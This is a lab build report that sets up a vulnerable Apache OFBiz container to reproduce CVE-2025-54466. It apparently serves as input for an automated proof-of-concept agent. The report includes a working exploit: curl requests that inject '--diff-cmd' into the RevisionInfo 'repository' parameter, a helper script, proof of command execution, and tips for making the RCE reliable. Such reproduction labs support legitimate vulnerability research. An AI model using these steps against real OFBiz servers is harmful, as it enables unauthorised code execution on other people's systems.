# Lab Build Report: CVE-2025-54466

## Lab Architecture

**Single-container architecture** — Apache OFBiz with embedded Derby database, Subversion client, and local SVN repository. No external database or services required.

### Container: `cve-2025-54466-vulnerable`

| Property | Value |
|---|---|
| **Image** | `cve-2025-54466-vulnerable` (built from source) |
| **Base Image** | `eclipse-temurin:17-jdk` |
| **Software** | Apache OFBiz 24.09.01 with ofbiz-plugins (scrum component) |
| **Ports** | 8443 (HTTPS), 8080 (HTTP), 5005 (debug) |
| **Networks** | `lab-net` (bridge) |
| **Credentials** | `admin` / `ofbiz` (demo data) |
| **SVN Repository** | `file:///home/ofbiz/svnrepo` (3 revisions) |
| **SVN Working Copy** | `/home/ofbiz/svnwc` (checked out from repo) |

---

## Build Status

| Component | Status | Notes |
|---|---|---|
| Builder stage (Gradle + Java 17) | ✅ SUCCESS | Clones framework + plugins at `release24.09.01`, builds distTar |
| Runtime stage (Temurin 17 + SVN) | ✅ SUCCESS | Installs xsltproc, subversion, curl |
| Demo data loading | ✅ SUCCESS | 16,523 rows loaded (includes admin/ofbiz user and scrum demo data) |
| SVN repository creation | ✅ SUCCESS | 3 revisions with file changes for `--diff-cmd` RCE testing |
| Host header configuration | ✅ SUCCESS | Entrypoint wrapper dynamically adds container IPs to allowed list |
| OFBiz startup | ✅ SUCCESS | Starts in ~30s, healthcheck passes |
| Scrum plugin loaded | ✅ SUCCESS | `/scrum/control/main` responds with login page |
| RevisionInfo endpoint | ✅ SUCCESS | Template renders, service executes SVN commands |
| **RCE via --diff-cmd** | ✅ **CONFIRMED** | Arbitrary command execution as `uid=1001(ofbiz)` |

---

## Container Details

### Dockerfile Structure (`Dockerfile.vulnerable`)

**Stage 1: Builder**
- Base: `eclipse-temurin:17-jdk`
- Clones `ofbiz-framework` at tag `release24.09.01`
- Clones `ofbiz-plugins` at tag `release24.09.01` into `plugins/`
- Builds distribution tar with `./gradlew --console plain --no-daemon distTar`

**Stage 2: Runtime**
- Base: `eclipse-temurin:17-jdk`
- Installs: `xsltproc`, `subversion`, `curl`
- Extracts OFBiz distribution from builder
- Patches `host-headers-allowed` in `security.properties` to accept Docker bridge IPs
- Loads demo data at build time (admin/ofbiz credentials, scrum demo data)
- Creates local SVN repository with 3 revisions and a working copy

### docker-compose.yml

```yaml
services:
  vulnerable:
    build:
      context: .
      dockerfile: Dockerfile.vulnerable
    container_name: cve-2025-54466-vulnerable
    environment:
      - OFBIZ_SKIP_INIT=true
    healthcheck:
      test: ["CMD", "curl", "-fks", "https://localhost:8443/accounting/control/main"]
      interval: 15s
      timeout: 10s
      retries: 20
      start_period: 180s
    networks:
      - lab-net

networks:
  lab-net:
    driver: bridge
```

### Supporting Files

- `entrypoint-wrapper.sh` — Patches `host-headers-allowed` at startup with actual container IPs, then delegates to OFBiz's official `docker-entrypoint.sh`

---

## Start/Stop Commands

```bash
# Start lab
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs -f

# Stop lab
docker compose down
```

---

## Verification Evidence

### 1. OFBiz Running and Accessible
```
$ curl -ks https://<container_ip>:8443/accounting/control/main → HTTP 401 (login page)
$ curl -ks https://<container_ip>:8443/scrum/control/main → HTTP 401 (login page)
```

### 2. Authentication Works
```
$ curl -ks -c cookies.txt https://<container_ip>:8443/scrum/control/login \
    -d "USERNAME=admin&PASSWORD=ofbiz" → HTTP 200 + JSESSIONID cookie
```

### 3. SVN Repository Ready
```
$ docker exec cve-2025-54466-vulnerable svn --version --quiet → 1.14.3
$ docker exec cve-2025-54466-vulnerable svn log file:///home/ofbiz/svnrepo →
  r3 | Third commit
  r2 | Second commit
  r1 | Initial commit
```

### 4. Vulnerable Endpoint Functional
```
$ curl -ks -b cookies.txt \
    "https://<container_ip>:8443/scrum/control/RevisionInfo?revision=2&repository=test"
→ HTTP 200, template renders with <pre> tags for logMessage and diffMessage
```

### 5. RCE Confirmed
```
# Create helper script
$ docker exec cve-2025-54466-vulnerable bash -c 'cat > /usr/local/bin/rce-test.sh <<SCRIPT
#!/bin/bash
date >> /tmp/rce-proof; id >> /tmp/rce-proof
SCRIPT
chmod +x /usr/local/bin/rce-test.sh'

# Send exploit (URL-encoded: --diff-cmd=/usr/local/bin/rce-test.sh /home/ofbiz/svnwc)
$ curl -ks -b cookies.txt --globoff \
    "https://<container_ip>:8443/scrum/control/RevisionInfo?revision=2&repository=--diff-cmd%3D/usr/local/bin/rce-test.sh%20/home/ofbiz/svnwc"
→ HTTP 200

# Verify command execution
$ docker exec cve-2025-54466-vulnerable cat /tmp/rce-proof
Sun Mar  1 12:56:04 AM UTC 2026
uid=1001(ofbiz) gid=1001(ofbiz) groups=1001(ofbiz)
```

---

## Known Issues and Workarounds

### 1. OFBiz Host Header Validation
**Issue:** OFBiz rejects requests where the `Host` header doesn't match `host-headers-allowed` in `security.properties`. Since lab connections come from dynamic Docker IPs, the Dockerfile patches the property with common Docker bridge IPs, and the `entrypoint-wrapper.sh` adds the actual container IP at startup.

**Workaround:** The entrypoint wrapper (`entrypoint-wrapper.sh`) dynamically detects the container's IP addresses and creates a `/ofbiz/config/security.properties` override (first on classpath) with those IPs added.

### 2. `UtilHttp.canonicalizeParameterMap` Bug with `file://` URLs
**Issue:** OFBiz's `UtilHttp.canonicalizeParameterMap()` crashes with `IndexOutOfBoundsException` when parameter values contain `file://` URLs. This is a pre-existing OFBiz bug (not related to the CVE), but it prevents using `file:///home/ofbiz/svnrepo` as the `repository` parameter value via HTTP.

**Workaround:** Use the SVN working copy path (`/home/ofbiz/svnwc`) instead of the `file://` repository URL. SVN's `--diff-cmd` works with both. The PoC should use:
```
repository=--diff-cmd=/path/to/cmd /home/ofbiz/svnwc
```
instead of:
```
repository=--diff-cmd=/path/to/cmd file:///home/ofbiz/svnrepo
```

### 3. SVN diff-cmd Argument Handling
**Issue:** SVN passes additional arguments to the `--diff-cmd` binary: `-u -L label1 -L label2 file1 file2`. Many standard binaries (e.g., `id`, `touch`) fail because they don't accept these arguments.

**Workaround:** Use a shell script wrapper as the diff command. The script can ignore SVN's arguments and execute arbitrary commands. A pre-built helper script (`/usr/local/bin/rce-test.sh`) needs to be created in the container for clean PoC demonstration. Alternatively, `--diff-cmd=/bin/sh` works if combined with arguments that `sh` can handle.

### 4. OFBiz Startup Time
**Issue:** OFBiz takes 30-60 seconds to fully start. The healthcheck has a `start_period: 180s` to accommodate this.

**Mitigation:** Demo data is pre-loaded at build time (`OFBIZ_SKIP_INIT=true`), so no data loading occurs at startup, reducing startup time.

---

## Accessing the Lab

```bash
# Access OFBiz via port mapping (HTTPS, self-signed cert)
curl -ks "https://localhost:8443/scrum/control/main"

# Login
curl -ks -c cookies.txt "https://localhost:8443/scrum/control/login" \
  -d "USERNAME=admin&PASSWORD=ofbiz"

# Send exploit (use --globoff for curl when URL contains special characters)
curl -ks --http1.1 -b cookies.txt --globoff \
  "https://localhost:8443/scrum/control/RevisionInfo?revision=2&repository=PAYLOAD"
```

---

## Key Facts for PoC Agent

1. **Container name:** `cve-2025-54466-vulnerable`
2. **Network:** `lab-net` (bridge)
3. **HTTPS port:** 8443 (self-signed cert, use `-k` with curl)
4. **Credentials:** `admin` / `ofbiz`
5. **Vulnerable endpoint:** `GET /scrum/control/RevisionInfo?revision=2&repository=PAYLOAD`
6. **Injection parameter:** `repository` (appended to `svn diff -r1:2 ` command)
7. **RCE mechanism:** `--diff-cmd=/path/to/binary /home/ofbiz/svnwc` → SVN executes the binary
8. **SVN working copy path:** `/home/ofbiz/svnwc` (use this, NOT `file://` URLs)
9. **SVN repo path:** `file:///home/ofbiz/svnrepo` (3 revisions; use via `docker exec` only)
10. **Output visibility:** `diffMessage` rendered in `<pre>` tag (in-band, HTML-entity encoded)
11. **Critical note:** Standard binaries may fail due to SVN's extra arguments to diff-cmd. Use a shell script wrapper for reliable RCE demonstration.
